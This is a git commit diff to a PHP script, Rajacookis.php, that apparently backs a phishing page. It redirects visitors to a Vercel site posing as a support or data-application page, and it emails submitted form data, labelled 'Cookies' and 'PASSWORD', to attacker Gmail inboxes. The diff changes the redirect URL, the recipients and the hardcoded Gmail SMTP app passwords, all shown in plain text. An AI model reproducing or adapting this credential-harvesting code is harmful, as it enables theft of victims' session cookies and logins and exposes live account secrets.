baec433ac5247cabb7ca8818f03fb831307ba91e
verifyingse440987 <verifyingservice79@gmail.com>
2025-09-17 22:57:07 +0500

    Update Rajacookis.php

--- Rajacookis.php
+++ Rajacookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-cccczqz4cd1pfr008-support.vercel.app/");
+header("Location: https://sure-apply-for-data.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -27,24 +27,25 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
-        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('patjckbang@gmail.com', 'PASSWORD');
-        $mail->addAddress('dreamfacebook24@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
-      $mail->addAddress('asifali.nizamani110@gmail.com');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
+        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('Lernayouamzaxal@gmail.com');
+      
+      
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'abdullah Cookies';
+        $mail->Subject = 'raja Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
